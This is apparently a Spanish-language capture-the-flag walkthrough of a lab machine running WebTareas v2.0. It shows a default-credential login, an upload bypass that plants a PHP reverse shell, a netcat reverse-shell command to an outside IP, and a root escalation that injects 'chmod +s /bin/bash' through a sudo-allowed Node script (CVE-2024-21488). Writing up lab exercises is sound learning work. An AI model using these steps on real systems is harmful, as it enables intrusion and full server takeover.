Credenciales

Al acceder al puerto 80 mediante un navegador, se presenta una interfaz de inicio de sesión correspondiente a WebTareas v2.0. Probando credenciales por defecto, se logra acceder utilizando:

Usuario: admin  
Contraseña: admin

Exploración web

Durante la exploración de la aplicación se identificaron dos ubicaciones distintas desde donde es posible subir archivos:

Subida de archivos

Sección de documentos

http://10.0.160.230/linkedcontent/addfile.php?doc_type=0&doc_id=1&borne16=0

Esta funcionalidad permite subir archivos dentro de subcarpetas específicas, por ejemplo: Default. Aquí se aceptan múltiples tipos de archivos, incluidas extensiones como .pdf, .txt, .gif, entre otras.

Actualización de foto de perfil

http://10.0.160.230/preferences/updateuser.php?

Esta ruta se utiliza específicamente para actualizar las preferencias del perfil, además de cambiar la imagen de perfil del usuario.

Funcionamiento de upload.php

A pesar de tratarse de secciones distintas, ambas funcionalidades reutilizan el mismo endpoint para la carga de los archivos:

POST /includes/upload.php

Aunque la subida directa de archivos .php está bloqueada, el endpoint acepta extensiones alternativas como .php3, .php5, .jpg, etc., y no valida que el contenido coincida con el tipo de archivo declarado, lo que permite subir archivos disfrazados. Adicionalmente, la interfaz web en updateuser.php impone una validación del lado del cliente que impide seleccionar archivos que no tengan la extensión de una imagen, devolviendo un error Unsupported file type si se intenta cargar otro tipo de extensión. Sin embargo, esta validación es fácilmente evadible al interactuar directamente con el endpoint o pasar el archivo con una extensión jpg.

Acceso a los archivos

Como se menciona en el CVE-2021-41919, es posible acceder directamente a los archivos subidos mediante la ruta: http://10.0.160.230/files/tmpXXXXXX: Aun así, estos archivos no pueden ejecutarse, ya que al no tener extensión .php, el servidor Apache los trata como archivos estáticos y no como un script.

En esta petición destacan dos parámetros clave:

  • attnam1: representa el nombre original del archivo.
  • atttmp1: corresponde a la ruta temporal del archivo en el servidor, previamente subida mediante /includes/upload.php. Esta información se utiliza internamente por la aplicación para copiar el archivo a una ruta accesible públicamente y asignar una foto de perfil, en este caso:
http://10.0.160.230/files/Avatars/X.XXX

Este funcionamiento se puede aprovechar para sustituir el nombre de la imagen(attnam1) pasándole un nombre con una extensión php simplemente manipulando el valor de attnam1 en la petición de updateuser.php. Aprovechando esta funcionalidad, se carga una shell inversa usando /includes/upload.php, se intercepta la petición de /preferences/updateuser.php y se cambia la extensión de attnam1 a una extensión php.

Shell inversa

Después de realizar la actualización de la foto perfil podremos ver nuestra shell inversa en 10.0.1.160.230/files/Avatars/X.php.

Esto proporciona una shell como el usuario www-data.

Escalada de privilegios

Podemos tener una shell más completa si ejecutamos: 

nc 10.10.1.46 4242 -e /bin/sh

y escuchamos con:

ncat -lvnp 4242

Con dicha reverse podemos hacer sudo -l para enumerar los comandos que pueden ejecutarse con privilegios elevados:

www-data@netchores:/var/www/html/files/Avatars$ sudo -l
Matching Defaults entries for www-data on netchores:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on netchores:
    (ALL : ALL) NOPASSWD: /usr/local/bin/whomac
www-data@netchores:/tmp$ strings /usr/local/bin/whomac
#! /usr/bin/env node
var network = require('network');
var args = process.argv.slice(2);
var iface=new network["mac_address_for"](args[0],args[1]);
console.log(iface);

Este código es vulnerable a inyección de comandos, específicamente a través de la función mac_address_for() del módulo network, el cual ha sido reportado como vulnerable bajo CVE-2024-21488.

Aprovechando esta inyección, se puede ejecutar un comando arbitrario. En este caso, se otorgan permisos SUID a /bin/bash para escalar privilegios:

www-data@netchores:/tmp$ sudo /usr/local/bin/whomac " \$(chmod +s /bin/bash) " "{}"

Aunque la ejecución devuelve un error de JavaScript (cb is not a function), el comando sí se ejecuta correctamente:

www-data@netchores:/tmp$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash

Finalmente, se obtiene una shell con privilegios de root utilizando la opción -p de bash:

www-data@netchores:/tmp$ bash -p
bash -p
bash-5.1# whoami
root
